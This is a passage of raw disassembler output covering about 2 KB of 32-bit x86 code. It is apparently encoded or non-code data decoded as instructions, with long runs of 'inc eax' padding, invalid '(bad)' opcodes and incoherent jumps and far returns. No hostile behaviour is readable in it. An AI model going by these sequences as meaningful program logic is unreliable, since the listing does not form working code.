  4027ae:	inc    eax
  4027af:	inc    eax
  4027b0:	inc    eax
  4027b1:	inc    eax
  4027b2:	inc    eax
  4027b3:	inc    eax
  4027b4:	stos   BYTE PTR es:[edi],al
  4027b5:	mov    DWORD PTR [eax-0x5f],0x5c34093
  4027bc:	cmp    DWORD PTR [ebx+0x40c84d40],0x9e5443ea
  4027c6:	inc    eax
  4027c7:	arpl   WORD PTR [esi+edi*1],ax
  4027ca:	xor    al,BYTE PTR [ebx+0x15]
  4027cd:	jl     0x40280f
  4027cf:	push   edx
  4027d0:	add    DWORD PTR [eax+0x40],ecx
  4027d3:	nop
  4027d4:	retf   
  4027d5:	inc    ax
  4027d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027d8:	inc    eax
  4027d9:	inc    eax
  4027da:	inc    eax
  4027db:	inc    eax
  4027dc:	inc    eax
  4027dd:	inc    eax
  4027de:	inc    eax
  4027df:	inc    eax
  4027e0:	add    BYTE PTR [edi+0x40],bh
  4027e3:	inc    edx
  4027e4:	loopne 0x402836
  4027e6:	push   0x2c03d340
  4027eb:	mov    dl,0x4d
  4027ed:	test   eax,0x592340bc
  4027f2:	inc    eax
  4027f3:	(bad)  
  4027f4:	int3   
  4027f5:	and    DWORD PTR [eax+eax*2+0x4f],0x40404003
  4027fd:	inc    eax
  4027fe:	inc    eax
  4027ff:	inc    eax
  402800:	and    eax,0x40404040
  402805:	dec    edi
  402806:	adc    eax,0xe24061a8
  40280b:	pop    edi
  40280c:	inc    eax
  40280d:	inc    eax
  40280e:	retf   
  40280f:	or     eax,0x2540b8
  402814:	cmp    al,0x90
  402816:	adc    DWORD PTR [ebx+0x65],ebp
  402819:	inc    eax
  40281a:	rol    DWORD PTR [eax+0x40],cl
  40281d:	inc    eax
  40281e:	inc    eax
  40281f:	inc    eax
  402820:	inc    eax
  402821:	inc    eax
  402822:	inc    eax
  402823:	inc    eax
  402824:	inc    eax
  402825:	sub    DWORD PTR [ecx+0x44],eax
  402828:	mov    al,ds:0xa1404db4
  40282d:	cs ins DWORD PTR es:[edi],dx
  40282f:	cmp    eax,0x40280d0d
  402834:	mov    ebp,0xcba4304c
  402839:	retf   
  40283a:	sahf   
  40283b:	inc    eax
  40283c:	push   ss
  40283d:	add    BYTE PTR [eax+0x63],al
  402840:	inc    eax
  402841:	inc    eax
  402842:	inc    eax
  402843:	inc    eax
  402844:	inc    eax
  402845:	inc    eax
  402846:	rol    DWORD PTR [eax+0x40],0x43
  40284a:	inc    ecx
  40284b:	jl     0x40288d
  40284d:	mov    eax,ds:0x61bc4c30
  402852:	inc    eax
  402853:	bound  eax,QWORD PTR [eax+0x5f]
  402856:	loopne 0x4028c2
  402858:	les    esi,FWORD PTR [ecx+eax*2]
  40285b:	inc    ecx
  40285c:	inc    eax
  40285d:	loope  0x40289f
  40285f:	inc    eax
  402860:	add    BYTE PTR [eax+0x40],al
  402863:	inc    eax
  402864:	inc    eax
  402865:	inc    eax
  402866:	inc    eax
  402867:	xchg   DWORD PTR [edi+ecx*2],eax
  40286a:	inc    ebx
  40286b:	mov    ah,0x18
  40286d:	inc    eax
  40286e:	inc    edx
  40286f:	dec    esi
  402870:	dec    eax
  402871:	push   esp
  402872:	and    BYTE PTR [ebp+0x69],ch
  402875:	inc    eax
  402876:	inc    eax
  402877:	inc    eax
  402878:	inc    eax
  402879:	inc    eax
  40287a:	inc    eax
  40287b:	inc    eax
  40287c:	inc    eax
  40287d:	inc    eax
  40287e:	inc    eax
  40287f:	inc    eax
  402880:	and    BYTE PTR gs:[edx+0x27],0x1e
  402885:	jno    0x40285d
  402887:	inc    eax
  402888:	xor    eax,0xa8414029
  40288d:	or     BYTE PTR [eax+eax*2],bh
  402890:	popa   
  402891:	cmp    BYTE PTR [eax+ebx*8+0x12],cl
  402895:	bound  eax,QWORD PTR [eax+0x40]
  402898:	inc    eax
  402899:	inc    eax
  40289a:	inc    eax
  40289b:	inc    eax
  40289c:	int3   
  40289d:	jne    0x4028df
  40289f:	dec    ebx
  4028a0:	inc    eax
  4028a1:	dec    eax
  4028a2:	cmp    BYTE PTR [ebp+0x4e],0x91
  4028a6:	and    eax,0x40356340
  4028ac:	aas    
  4028ad:	inc    ecx
  4028af:	and    al,BYTE PTR [eax+0x47]
  4028b2:	inc    edi
  4028b3:	inc    eax
  4028b4:	add    cl,al
  4028b6:	inc    eax
  4028b7:	inc    eax
  4028b8:	inc    eax
  4028b9:	inc    eax
  4028ba:	add    BYTE PTR [eax+0x60],al
  4028bd:	test   al,0x7d
  4028bf:	dec    edi
  4028c0:	dec    ebx
  4028c1:	inc    eax
  4028c2:	and    DWORD PTR [edx-0x15979a99],eax
  4028c8:	rol    DWORD PTR [eax+0x51],0xf5
  4028cc:	sub    al,0xd7
  4028ce:	fs push esp
  4028d0:	pushf  
  4028d1:	inc    eax
  4028d2:	popa   
  4028d3:	ins    DWORD PTR es:[edi],dx
  4028d4:	push   edi
  4028d5:	bound  ebp,QWORD PTR [ebp+0x5]
  4028d8:	cmp    al,0x40
  4028da:	push   edi
  4028db:	call   0x4062:0x433c52fc
  4028e2:	inc    eax
  4028e3:	inc    eax
  4028e4:	inc    eax
  4028e5:	inc    eax
  4028e6:	inc    eax
  4028e7:	inc    eax
  4028e8:	inc    eax
  4028e9:	inc    DWORD PTR [eax+0x40]
  4028ec:	and    DWORD PTR [ecx+0x756734a8],edx
  4028f2:	inc    edx
  4028f3:	inc    eax
  4028f4:	mov    edi,0x7e4153c3
  4028f9:	jmp    0x40291f
  4028fb:	inc    eax
  4028fc:	inc    edx
  4028fd:	cmp    BYTE PTR [ecx],0x2c
  402900:	aaa    
  402901:	bound  ebx,QWORD PTR [edx]
  402903:	inc    eax
  402904:	mov    eax,ds:0x40404021
  402909:	inc    eax
  40290a:	inc    eax
  40290b:	inc    eax
  40290c:	inc    eax
  40290d:	inc    eax
  40290e:	inc    eax
  40290f:	inc    eax
  402910:	xchg   edx,eax
  402911:	pop    eax
  402912:	test   al,0x15
  402914:	popa   
  402915:	inc    eax
  402916:	sti    
  402917:	pop    esi
  402918:	jae    0x402958
  40291a:	adc    ecx,ecx
  40291c:	jo     0x40295e
  40291e:	loope  0x402920
  402920:	sub    BYTE PTR [eax+0x4040b4b4],0x40
  402927:	inc    eax
  402928:	inc    eax
  402929:	inc    eax
  40292a:	inc    eax
  40292b:	inc    eax
  40292c:	add    BYTE PTR [edx],ah
  40292e:	inc    eax
  40292f:	inc    eax
  402930:	pusha  
  402931:	retf   
  402932:	or     ecx,DWORD PTR ds:0x6c406315
  402938:	fwait
  402939:	xor    DWORD PTR [ebx],0xffffffcb
  40293c:	inc    eax
  40293d:	inc    eax
  40293e:	inc    eax
  40293f:	inc    eax
  402940:	inc    eax
  402941:	inc    eax
  402942:	and    eax,0x43404040
  402947:	inc    edx
  402948:	inc    eax
  402949:	iret   
  40294a:	sub    DWORD PTR [edx+0x2a514462],0x40
  402951:	fs jge 0x4028e7
  402954:	dec    eax
  402955:	jp     0x402956
  402957:	dec    ebx
  402958:	jae    0x402988
  40295a:	inc    eax
  40295b:	inc    eax
  40295c:	inc    eax
  40295d:	inc    eax
  40295e:	inc    eax
  40295f:	inc    eax
  402960:	inc    eax
  402961:	inc    eax
  402962:	inc    eax
  402963:	inc    eax
  402964:	adc    DWORD PTR [eax+0x224f1c4b],0xed2b4cc7
  40296e:	sub    eax,0x73445062
  402973:	and    DWORD PTR [ebp+0x46],ebp
  402976:	popa   
  402977:	pop    ebp
  402978:	or     eax,0x81483c48
  40297d:	push   edi
  40297e:	or     dh,BYTE PTR [eax]
  402980:	retf   
  402981:	sub    eax,0x9c58e573
  402986:	jmp    0x408075b9
  40298b:	inc    eax
  40298c:	inc    eax
  40298d:	inc    eax
  40298e:	inc    eax
  40298f:	rol    DWORD PTR [eax+0x40],0xdb
  402993:	sub    cl,BYTE PTR [ebx+0x60d65381]
  402999:	dec    ecx
  40299a:	repz jae 0x4029e3
  40299d:	or     eax,0xe9b5113c
  4029a2:	pushf  
  4029a3:	pop    ds
  4029a4:	and    eax,0x64a44389
  4029a9:	inc    eax
  4029aa:	inc    eax
  4029ab:	add    BYTE PTR [eax+0x40],al
  4029ae:	inc    eax
  4029af:	inc    eax
  4029b0:	inc    eax
  4029b1:	inc    eax
  4029b2:	inc    esp
  4029b3:	sub    dh,BYTE PTR [ebx-0x36]
  4029b6:	xor    DWORD PTR [eax+0x78],ecx
  4029b9:	inc    esp
  4029ba:	arpl   WORD PTR [edi],bp
  4029bc:	sbb    DWORD PTR [ecx],esp
  4029be:	add    DWORD PTR [eax+0x7a],ebp
  4029c1:	sub    BYTE PTR [ecx-0x60],0x73
  4029c5:	pusha  
  4029c6:	enter  0x6282,0xec
  4029ca:	sbb    BYTE PTR [edx+0x7f],dh
  4029cd:	arpl   WORD PTR [ecx+0x40404040],ax
  4029d3:	inc    eax
  4029d4:	inc    eax
  4029d5:	inc    eax
  4029d6:	inc    eax
  4029d7:	inc    eax
  4029d8:	inc    eax
  4029d9:	sbb    ebx,DWORD PTR [eax]
  4029db:	in     al,0x62
  4029dd:	js     0x402a51
  4029df:	add    BYTE PTR [esi+ebx*1+0x0],0x60
  4029e4:	frstor [ebp-0xe]
  4029e7:	jecxz  0x40296b
  4029e9:	xchg   bl,cl
  4029eb:	mov    dh,0x40
  4029ed:	dec    eax
  4029ee:	jb     0x402a22
  4029f0:	cs retf 
  4029f2:	mov    edi,0xe73b6362
  4029f7:	loope  0x402a27
  4029f9:	xchg   edx,eax
  4029fa:	mov    esi,0x40404040
  4029ff:	inc    eax
  402a00:	inc    eax
  402a01:	int3   
  402a02:	jne    0x402a44
  402a04:	inc    esp
  402a05:	push   eax
  402a06:	fnsave [edx+0x54]
  402a09:	add    DWORD PTR [ebx-0x46],esi
  402a0c:	sub    al,0x15
  402a0e:	inc    eax
  402a0f:	jge    0x402a32
  402a11:	mov    ebp,0xcbc3dc0e
  402a16:	shl    BYTE PTR [ecx+0x44],0x40
  402a1a:	add    cl,al
  402a1c:	inc    eax
  402a1d:	inc    eax
  402a1e:	inc    eax
  402a1f:	inc    eax
  402a20:	add    BYTE PTR [eax+0x7f],al
  402a23:	inc    ecx
  402a24:	test   al,0xc4
  402a26:	test   al,0x8c
  402a28:	sahf   
  402a29:	and    eax,DWORD PTR [ebx+0xd4fbf36]
  402a2f:	and    BYTE PTR [ecx+0x17],dh
  402a32:	jno    0x402a80
  402a34:	sub    ah,BYTE PTR [eax-0x37]
  402a37:	and    eax,0x6401a2c5
  402a3c:	inc    eax
  402a3d:	lahf   
  402a3e:	inc    ebx
  402a3f:	inc    eax
  402a40:	inc    eax
  402a41:	inc    eax
  402a42:	inc    eax
  402a43:	inc    eax
  402a44:	inc    eax
  402a45:	inc    eax
  402a46:	inc    eax
  402a47:	inc    DWORD PTR [eax+0x6a]
  402a4a:	jno    0x402a0b
  402a4c:	jae    0x402a52
  402a4e:	sub    ah,BYTE PTR [edx+0x41]
  402a51:	inc    ebx
  402a52:	adc    BYTE PTR [edi],ah
  402a54:	test   BYTE PTR [ebx-0x41],bh
  402a57:	add    eax,0x5371d074
  402a5c:	xor    al,BYTE PTR [edi-0x41]
  402a5f:	inc    ebx
  402a60:	ins    DWORD PTR es:[edi],dx
  402a61:	loope  0x402a63
  402a63:	mov    eax,ds:0x4040400b
  402a68:	inc    eax
  402a69:	inc    eax
  402a6a:	inc    eax
  402a6b:	inc    eax
  402a6c:	inc    eax
  402a6d:	inc    eax
  402a6e:	inc    eax
  402a6f:	xor    dh,BYTE PTR [edx+0x54]
  402a72:	dec    esp
  402a73:	inc    edi
  402a74:	jno    0x402abf
  402a76:	or     DWORD PTR [eax-0x4b],0x62fd0d6c
  402a7d:	bound  ebp,QWORD PTR [ecx+0x37]
  402a80:	test   al,0xcb
  402a82:	inc    eax
  402a83:	inc    eax
  402a84:	inc    eax
  402a85:	inc    eax
  402a86:	inc    eax
  402a87:	inc    eax
  402a88:	inc    eax
  402a89:	inc    eax
  402a8a:	add    cl,cl
  402a8c:	sti    
  402a8d:	jno    0x402abe
  402a8f:	add    eax,0x41634050
  402a94:	cmp    ecx,DWORD PTR [edx+eax*2-0x77]
  402a98:	fs inc eax
  402a9a:	mov    al,ds:0xe140d1a9
  402a9f:	adc    DWORD PTR [eiz*2+0x4048c35b],0x30
  402aa7:	inc    eax
  402aa8:	inc    eax
  402aa9:	inc    eax
  402aaa:	inc    eax
  402aab:	inc    eax
  402aac:	inc    eax
  402aad:	and    eax,0x62404040
  402ab2:	jnp    0x402a9e
  402ab4:	xchg   ecx,eax
  402ab5:	dec    esp
  402ab6:	inc    edx
  402ab7:	inc    eax
  402ab8:	daa    
  402ab9:	or     DWORD PTR [esi-0x58],0x683144b1
  402ac0:	ss scas eax,DWORD PTR es:[edi]
  402ac2:	xor    bl,BYTE PTR [eax-0xb]
  402ac5:	scas   al,BYTE PTR es:[edi]
  402ac6:	sbb    BYTE PTR [eax-0x5d],al
  402ac9:	inc    eax
  402aca:	inc    eax
  402acb:	inc    eax
  402acc:	inc    eax
  402acd:	inc    eax
  402ace:	inc    eax
  402acf:	inc    eax
  402ad0:	inc    eax
  402ad1:	inc    eax
  402ad2:	inc    eax
  402ad3:	pusha  
  402ad4:	xchg   ecx,eax
  402ad5:	xor    al,0xa8
  402ad7:	jo     0x402a60
  402ad9:	inc    ecx
  402ada:	pop    ecx
  402adb:	add    eax,0x62124643
  402ae0:	test   al,0x20
  402ae2:	and    DWORD PTR [esi+eiz*4+0x40],ebp
  402ae6:	mov    al,0xc9
  402ae8:	jle    0x402b2a
  402aea:	das    
  402aeb:	add    esi,DWORD PTR [edi-0x44bdead8]
  402af1:	inc    eax
  402af2:	inc    esp
  402af3:	inc    eax
  402af4:	inc    eax
  402af5:	inc    eax
  402af6:	inc    eax
  402af7:	inc    eax
  402af8:	inc    eax
  402af9:	rol    DWORD PTR [eax+0x40],0x22
  402afd:	push   esp
  402afe:	ins    BYTE PTR es:[edi],dx
  402aff:	inc    ebx
  402b00:	and    BYTE PTR [ebx+0x40],0x21
  402b04:	and    DWORD PTR [ebx+eiz*2-0x44],0x5a7b02c3
  402b0c:	sbb    DWORD PTR [esi+esi*1],eax
  402b0f:	inc    eax
  402b10:	inc    eax
  402b11:	add    BYTE PTR [eax+0x40],al
  402b14:	inc    eax
  402b15:	inc    eax
  402b16:	inc    eax
  402b17:	inc    eax
  402b18:	inc    ebp
  402b19:	push   eax
  402b1a:	inc    ecx
  402b1b:	push   0xa4cb01a5
  402b20:	cmp    al,BYTE PTR [edx-0x4c]
  402b23:	jnp    0x402b36
  402b25:	in     al,0x88
  402b27:	(bad)  
  402b28:	sar    BYTE PTR [ecx],1
  402b2a:	sub    BYTE PTR [edx+0x61],dl
  402b2d:	or     bl,0xa8
  402b30:	in     al,dx
  402b31:	push   0x234f7a5d
  402b36:	pop    eax
  402b37:	adc    ah,al
  402b39:	bound  esi,QWORD PTR [ebp*1+0x40644461]
  402b40:	inc    eax
  402b41:	inc    eax
  402b42:	inc    eax
  402b43:	inc    eax
  402b44:	inc    eax
  402b45:	inc    eax
  402b46:	inc    eax
  402b47:	inc    eax
  402b48:	inc    eax
  402b49:	sub    DWORD PTR [edi+0x0],ecx
  402b4c:	cmp    BYTE PTR [ecx+0x40],0x1
  402b50:	and    al,0xf6
  402b52:	and    BYTE PTR [edx+0x4040d4c5],0x40
  402b59:	inc    eax
  402b5a:	inc    eax
  402b5b:	inc    eax
  402b5c:	int3   
  402b5d:	jne    0x402b9f
  402b5f:	mov    al,ds:0xc51fb746
  402b64:	ret    
  402b65:	inc    ebp
  402b66:	jns    0x402b98
  402b68:	add    BYTE PTR [eax+0x434e50a8],dh
  402b6e:	(bad)  
  402b6f:	sub    edi,DWORD PTR [ebx+0x4012cb]
  402b75:	rol    DWORD PTR [eax+0x40],0x40
  402b79:	inc    eax
  402b7a:	add    BYTE PTR [eax+0x43],al
  402b7d:	cmp    ebx,eax
  402b7f:	jns    0x402be2
  402b81:	add    eax,0x7f7b5cb3
  402b86:	fdiv   QWORD PTR [edi+0x4a]
  402b89:	les    esi,FWORD PTR [edi+0x408cd011]
  402b8f:	inc    eax
  402b90:	inc    eax
  402b91:	inc    eax
  402b92:	inc    eax
  402b93:	inc    eax
  402b94:	inc    eax
  402b95:	inc    eax
  402b96:	inc    DWORD PTR [eax+0x4c]
  402b99:	jns    0x402b3c
  402b9b:	xchg   DWORD PTR [ebx+ecx*8+0x671d62ac],esi
  402ba2:	mov    ebx,0xa8ac35e0
  402ba7:	lds    esp,FWORD PTR [esi]
  402ba9:	js     0x402bf3
  402bab:	add    cl,BYTE PTR [ecx+0x634f110d]
  402bb1:	(bad)  
  402bb2:	loope  0x402be4
  402bb4:	dec    ebx
  402bb5:	retf   
  402bb6:	mov    esp,0x46782044
  402bbb:	inc    eax
  402bbc:	inc    eax
  402bbd:	inc    eax
  402bbe:	inc    eax
  402bbf:	inc    eax
  402bc0:	inc    eax
  402bc1:	inc    eax
  402bc2:	inc    eax
  402bc3:	inc    eax
  402bc4:	inc    eax
  402bc5:	pop    ss
  402bc6:	cwde   
  402bc7:	xchg   esp,eax
  402bc8:	inc    ecx
  402bc9:	inc    eax
  402bca:	cld    
  402bcb:	test   cl,ah
  402bcd:	adc    DWORD PTR [ecx+0x69fb7bab],0x40404040
  402bd7:	inc    eax
  402bd8:	inc    eax
  402bd9:	inc    eax
  402bda:	inc    eax
  402bdb:	add    BYTE PTR [eax+0x43],bh
  402bde:	jo     0x402b8a
  402be0:	dec    eax
  402be1:	lock addr16 jno 0x402bdc
  402be5:	and    DWORD PTR [ebx+0x49121e91],eax
  402beb:	dec    esp
  402bec:	js     0x402c45
  402bee:	jp     0x402b8b
  402bf0:	lock mov eax,0x21ec66a9
  402bf6:	xchg   BYTE PTR [ecx+0x58501564],dl
  402bfc:	inc    eax
  402bfd:	inc    eax
  402bfe:	inc    eax
  402bff:	inc    eax
  402c00:	inc    eax
  402c01:	inc    eax
  402c02:	and    eax,0x78404040
  402c07:	inc    esi
  402c08:	sub    DWORD PTR [ecx-0x3f3632b0],ebp
  402c0e:	loope  0x402bb1
  402c10:	cs xchg ecx,eax
  402c12:	test   al,0x41
  402c14:	es jne 0x402c8f
  402c17:	push   esi
  402c18:	sub    ah,BYTE PTR [eax+eax*2-0x60]
  402c1c:	mov    al,0xbb
  402c1e:	aam    0xa5
  402c20:	add    al,BYTE PTR [eax+0x40]
  402c23:	sub    al,0x5
  402c25:	test   al,0x78
  402c27:	inc    eax
  402c28:	inc    eax
  402c29:	inc    eax
  402c2a:	inc    eax
  402c2b:	inc    eax
  402c2c:	inc    eax
  402c2d:	inc    eax
  402c2e:	inc    eax
  402c2f:	inc    eax
  402c30:	inc    eax
  402c31:	add    al,0x37
  402c33:	inc    edx
  402c34:	push   ebx
  402c35:	cs retf 
  402c37:	adc    dl,cl
  402c39:	bound  eax,QWORD PTR [edi+0x2c]
  402c3c:	enter  0x5020,0xac
  402c40:	inc    eax
  402c41:	inc    eax
  402c42:	inc    eax
  402c43:	inc    eax
  402c44:	inc    eax
  402c45:	inc    eax
  402c46:	rol    DWORD PTR [eax+0x40],0x78
  402c4a:	das    
  402c4b:	adc    BYTE PTR [eax+0x28],0x9c
  402c4f:	mov    edx,0x8be3f05
  402c54:	fs dec edi
  402c56:	add    eax,0x8d784381
  402c5b:	les    edx,FWORD PTR [esi*1+0x3241b487]
  402c62:	loope  0x402bee
  402c64:	retf   
  402c65:	inc    eax
  402c66:	cmp    eax,0x4b788c49
  402c6b:	outs   dx,BYTE PTR ds:[esi]
  402c6c:	inc    eax
  402c6d:	inc    eax
  402c6e:	add    BYTE PTR [eax+0x40],al
  402c71:	inc    eax
  402c72:	inc    eax
  402c73:	inc    eax
  402c74:	inc    eax
  402c75:	push   esp
  402c76:	inc    edi
  402c77:	lahf   
  402c78:	out    dx,eax
  402c79:	inc    edi
  402c7a:	daa    
  402c7b:	loope  0x402cd5
  402c7d:	fs mov dl,0x68
  402c80:	nop
  402c81:	jne    0x402cfb
  402c83:	add    al,0x7
  402c85:	sbb    al,0xf0
  402c87:	sub    al,0x63
  402c89:	jne    0x402ca7
  402c8b:	loope  0x402ce0
  402c8d:	inc    eax
  402c8e:	inc    eax
  402c8f:	inc    eax
  402c90:	inc    eax
  402c91:	inc    eax
  402c92:	inc    eax
  402c93:	inc    eax
  402c94:	inc    eax
  402c95:	inc    eax
  402c96:	inc    eax
  402c97:	retf   
  402c98:	dec    esp
  402c99:	add    eax,0x7a786254
  402c9e:	add    ecx,DWORD PTR [eax+0x410dcb45]
  402ca4:	push   fs
  402ca6:	jmp    0x402c73
  402ca8:	xor    eax,0x788c43a1
  402cad:	sub    al,0x26
  402caf:	add    DWORD PTR [ebp-0x7a],edi
  402cb2:	mov    ah,0x53
  402cb4:	add    al,0x1b
  402cb6:	sub    DWORD PTR [ebx-0x57f2bf7a],0x40404040
  402cc0:	inc    eax
  402cc1:	inc    eax
  402cc2:	int3   
  402cc3:	jne    0x402d05
  402cc5:	js     0x402c68
  402cc7:	push   eax
  402cc8:	xchg   ebx,eax
  402cc9:	inc    eax
  402cca:	jnp    0x402d0e
  402ccc:	adc    DWORD PTR [ecx+0x52],edi
  402ccf:	or     ebx,0x9473c9aa
  402cd5:	js     0x402cb8
  402cd7:	fnsave [ecx+0x41a06267]
  402cdd:	imul   eax,DWORD PTR [esi+0x5],0x623c0ab7
  402ce4:	inc    esp
  402ce5:	js     0x402cc8
  402ce7:	jg     0x402d35
  402ce9:	inc    eax
  402cea:	add    cl,al
  402cec:	inc    eax
  402ced:	inc    eax
  402cee:	inc    eax
  402cef:	inc    eax
  402cf0:	add    BYTE PTR [eax+0x6c],al
  402cf3:	sub    BYTE PTR [eax-0x44],dl
  402cf6:	pop    edi
  402cf7:	mov    bh,0x89
  402cf9:	fs addr16 inc ecx
  402cfc:	mov    al,ds:0x3d15785f
  402d01:	add    al,0x15
  402d03:	push   esi
  402d04:	sub    DWORD PTR [eax-0x347fdeb0],0x1042a9d4
  402d0e:	ja     0x402d54
  402d10:	sub    al,0x98
  402d12:	shl    BYTE PTR [edi+esi*8+0x4ca0bcc7],cl
  402d19:	inc    eax
  402d1a:	inc    eax
  402d1b:	inc    eax
  402d1c:	inc    eax
  402d1d:	inc    eax
  402d1e:	inc    eax
  402d1f:	inc    eax
  402d20:	inc    eax
  402d21:	inc    DWORD PTR [eax-0x35]
  402d24:	lds    eax,FWORD PTR [ecx+0x4f]
  402d27:	aaa    
  402d28:	inc    eax
  402d29:	sub    DWORD PTR [ecx-0x4f98b04f],eax
  402d2f:	adc    DWORD PTR [eax-0x3b],eax
  402d32:	inc    eax
  402d33:	inc    eax
  402d34:	inc    eax
  402d35:	inc    eax
  402d36:	inc    eax
  402d37:	inc    eax
  402d38:	inc    eax
  402d39:	inc    eax
  402d3a:	inc    eax
  402d3b:	inc    eax
  402d3c:	movzx  eax,WORD PTR [eax-0x18]
  402d40:	adc    eax,0x5ad40c9
  402d45:	xchg   edx,eax
  402d46:	nop
  402d47:	(bad)  
  402d48:	retf   
  402d49:	cmp    BYTE PTR [ebp+eax*8-0x45],0x73
  402d4e:	cmp    eax,0x40406640
  402d53:	inc    eax
  402d54:	inc    eax
  402d55:	inc    eax
  402d56:	inc    eax
  402d57:	inc    eax
  402d58:	inc    eax
  402d59:	add    BYTE PTR ds:0x5069bf40,dl
  402d5f:	ret    
  402d60:	pop    esp
  402d61:	xor    eax,0x872f4141
  402d66:	fs dec edx
  402d68:	jge    0x402dab
  402d6a:	dec    eax
  402d6b:	adc    BYTE PTR [ecx+0x40],ah
  402d6e:	inc    eax
  402d6f:	inc    eax
  402d70:	inc    eax
  402d71:	inc    eax
  402d72:	inc    eax
  402d73:	and    eax,0x56404040
  402d78:	add    al,0x45
  402d7a:	out    dx,al
  402d7b:	mov    ecx,0x81c0403c
  402d80:	retf   
  402d81:	push   cs
  402d82:	arpl   bx,ax
  402d84:	pop    esp
  402d85:	inc    eax
  402d86:	in     al,0x75
  402d88:	push   esp
  402d89:	in     al,0x58
  402d8b:	mov    esp,0x40404040
  402d90:	inc    eax
  402d91:	inc    eax
  402d92:	inc    eax
  402d93:	inc    eax
  402d94:	inc    eax
  402d95:	inc    eax
  402d96:	add    al,BYTE PTR [eax+0x32]
  402d99:	and    BYTE PTR [ebx+eiz*2+0x46],0xd
  402d9e:	leave  
  402d9f:	jne    0x402d3f
  402da1:	and    cl,BYTE PTR [eax+edx*4]
  402da4:	std    
  402da5:	test   DWORD PTR [edi+eiz*2+0x5cb6270],0x75054f67
  402db0:	and    DWORD PTR [eax+0x40],eax
  402db3:	inc    eax
  402db4:	inc    eax
  402db5:	inc    eax
  402db6:	inc    eax
  402db7:	rol    DWORD PTR [eax+0x40],0x1
  402dbb:	pop    eax
  402dbc:	leave  
  402dbd:	xor    al,0x40
  402dbf:	inc    edx
  402dc0:	push   edx
  402dc1:	repz enter 0x4435,0x40
  402dc6:	inc    eax
  402dc7:	dec    eax
  402dc8:	je     0x402e2b
  402dca:	add    DWORD PTR [eax+0x3c424841],0x4b7c6044
  402dd4:	inc    ecx
  402dd5:	pop    eax
  402dd6:	js     0x402e3b
  402dd8:	inc    eax
  402dd9:	pop    ecx
  402dda:	add    ebx,DWORD PTR [eax+0x30]
  402ddd:	iret   
  402dde:	test   eax,0x40402c
  402de3:	inc    eax
  402de4:	inc    eax
  402de5:	inc    eax
  402de6:	inc    eax
  402de7:	inc    eax
  402de8:	inc    eax
  402de9:	inc    eax
  402dea:	es leave 
  402dec:	fs pop ecx
  402dee:	addr16 push eax
  402df0:	push   0x481a340
  402df5:	push   esp
  402df6:	fs inc esi
  402df8:	push   0x50
  402dfa:	cmp    BYTE PTR [edi+0x4063a8cb],ch
  402e00:	leave  
  402e01:	inc    eax
  402e02:	out    0x58,al
  402e04:	push   ss
  402e05:	inc    eax
  402e06:	cmp    eax,0x244142a3
  402e0b:	inc    eax
  402e0c:	inc    eax
  402e0d:	inc    eax
  402e0e:	inc    eax
  402e0f:	inc    eax
  402e10:	inc    eax
  402e11:	inc    eax
  402e12:	inc    eax
  402e13:	inc    eax
  402e14:	inc    eax
  402e15:	xchg   DWORD PTR [ebx],edx
  402e17:	sub    ch,BYTE PTR [edx-0x54]
  402e1a:	lock add BYTE PTR ds:0x5ca85a44,bl
  402e21:	fs pop es
  402e23:	inc    eax
  402e24:	popa   
  402e25:	test   DWORD PTR [eax+0x5],eax
  402e28:	and    BYTE PTR [ebx-0xa],al
  402e2b:	jge    0x402dba
  402e2d:	sub    cl,BYTE PTR [ecx-0x37]
  402e30:	jo     0x402e5b
  402e32:	inc    eax
  402e33:	inc    eax
  402e34:	inc    eax
  402e35:	inc    eax
  402e36:	inc    eax
  402e37:	inc    eax
  402e38:	int3   
  402e39:	jne    0x402e7b
  402e3b:	leave  
  402e3c:	add    BYTE PTR [ebx-0x7e],0xdc
  402e40:	inc    ebp
  402e41:	in     al,dx
  402e42:	lds    ebx,FWORD PTR [esi]
  402e44:	jge    0x402e28
  402e46:	sub    al,0x1f
  402e48:	pop    DWORD PTR [eax+0x0]
  402e4b:	rol    DWORD PTR [eax+0x40],0x40
  402e4f:	inc    eax
  402e50:	add    BYTE PTR [eax-0x34],al
  402e53:	push   edx
  402e54:	adc    al,0xec
  402e56:	pusha  
  402e57:	dec    eax
  402e58:	in     al,dx
  402e59:	push   0x7d62358b
  402e5e:	pop    ss
  402e5f:	add    BYTE PTR [edx+0x63],0xc4
  402e63:	dec    edx
  402e64:	xor    eax,0x4040623d
  402e69:	inc    eax
  402e6a:	inc    eax
  402e6b:	inc    eax
  402e6c:	inc    eax
  402e6d:	inc    eax
  402e6e:	inc    eax
  402e6f:	inc    DWORD PTR [eax+0x21]
  402e72:	pop    eax
  402e73:	bound  ebp,QWORD PTR [ecx-0x48]
  402e76:	inc    eax
  402e77:	jge    0x402eae
  402e79:	retf   0x2182
  402e7c:	hlt    
  402e7d:	ret    
  402e7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e7f:	pop    ds
  402e80:	aas    
  402e81:	add    ecx,ebx
  402e83:	mov    fs,WORD PTR [ebx+0x42]
  402e86:	cmp    eax,0x5f19e37d
  402e8b:	stos   BYTE PTR es:[edi],al
  402e8c:	inc    eax
  402e8d:	inc    eax
  402e8e:	inc    eax
  402e8f:	inc    eax
  402e90:	inc    eax
  402e91:	inc    eax
  402e92:	inc    eax
  402e93:	inc    eax
  402e94:	inc    eax
  402e95:	inc    eax
  402e96:	push   eax
  402e97:	ins    BYTE PTR es:[edi],dx
  402e98:	ret    
  402e99:	add    DWORD PTR [eax*4+0x386a62ba],edi
  402ea0:	inc    edx
  402ea1:	jge    0x402e86
  402ea3:	stos   DWORD PTR es:[edi],eax
  402ea4:	add    DWORD PTR [eax+0x40],0x40404040
  402eab:	inc    eax
  402eac:	inc    eax
  402ead:	add    ch,cl
  402eaf:	cmp    DWORD PTR [ecx+0x4f],ecx
  402eb2:	arpl   WORD PTR [edx],dx
  402eb4:	jae    0xe074f851
  402eba:	jl     0x402f1f
  402ebc:	add    bh,BYTE PTR [eax+0x1c43263d]
  402ec2:	xor    al,0x40
  402ec4:	inc    eax
  402ec5:	inc    eax
  402ec6:	inc    eax
  402ec7:	inc    eax
  402ec8:	inc    eax
  402ec9:	and    eax,0x5a404040
  402ece:	and    DWORD PTR [edx+ecx*2-0x48],eax
  402ed2:	mov    edx,0x6217b73
  402ed7:	inc    esp
  402ed8:	xor    BYTE PTR [eax-0x3d],ah
  402edb:	and    eax,0x2083efa7
  402ee0:	pop    esi
  402ee1:	jg     0x402e9f
  402ee3:	bound  edi,QWORD PTR [ebx+0x10]
